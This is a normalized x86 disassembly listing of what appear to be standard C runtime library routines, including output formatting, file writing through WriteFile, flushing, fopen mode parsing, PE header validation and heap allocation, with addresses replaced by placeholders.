mov [ ebp - 0x20c ] al
mov [ ebp - 0x228 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_44b905
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x244 ] 0x0
inc eax
add eax 0x2
mov edi [ ebp - 0x264 ]
push eax
push [ ebp - 0x220 ]
lea eax [ ebp - 0x224 ]
call sub_44112c
pop ecx
pop ecx
test eax eax
jle r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_4410f9
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_43ddd2
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x260 ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x234 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x220 ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x220 ]
mov [ ebp - 0x270 ] eax
test edi edi
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x268 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x220 ] ebx
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x228 ]
cdq
push edx
push eax
push edi
push ebx
call sub_43ad30
add ecx 0x30
mov [ ebp - 0x268 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x278 ] eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx ebx
mov al 0x30
dec edi
call sub_4410f9
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_43c860
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x258 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
push [ ebp - 0x278 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_44112c
cmp [ ebp - 0x270 ] 0x0
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_4410f9
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x270 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x278 ]
push eax
add esi 0x2
call sub_44b905
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x220 ]
mov ecx [ ebp - 0x220 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_44a386
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_44de8f
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_43de17
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_4381f8
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_43de17
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_444384
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_44de8f
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_43f873
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_4381f8
pop ecx
inc esi
push esi
push eax
call sub_43de17
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_4381f8
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_44de8f
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
sub_44a550
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_44a590
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_44a5e0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_43f940
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_44a550
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_44a590
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a69c
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_43a7f0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_43c05f
mov [ eax ] edi
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_437c1c
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
jmp r-xdata
push esi
call sub_44cd54
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_44bd22
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_43ffe0
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_43c04c
mov [ eax ] 0x1c
call sub_43c05f
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_43c072
pop ecx
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_44b629
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_44dec9
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_44b5d7
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_44b5d7
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_44dec9
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_44ad99
push 0x10
push r--data
call sub_43f8e0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
call sub_43c04c
mov [ eax ] 0x9
call sub_43f8c5
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_43f925
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_442e0b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c05f
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_44a69c
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44ae65
mov eax [ ebp - 0x1c ]
sub_44ae6d
push 0x10
push r--data
call sub_43f8e0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_43c04c
mov [ eax ] 0x9
call sub_43c04c
mov [ eax ] 0x9
call sub_43f8c5
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_43f925
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_442e0b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_43c04c
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_442da2
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44af3e
mov eax [ ebp - 0x1c ]
call sub_43c05f
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44af46
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edi [ ecx + 0x7f ]
mov edx 0x4000
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_44e703
add esp 0x14
test eax eax
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_44ea8d
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx edi
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_44e927
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_44e927
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_44e927
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_44b1f0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_44ca3c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_44ca3c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_44b23c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
pop ebp
retn
sub_44b281
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_44b2a1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_43c04c
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_43f309
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_44b323
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
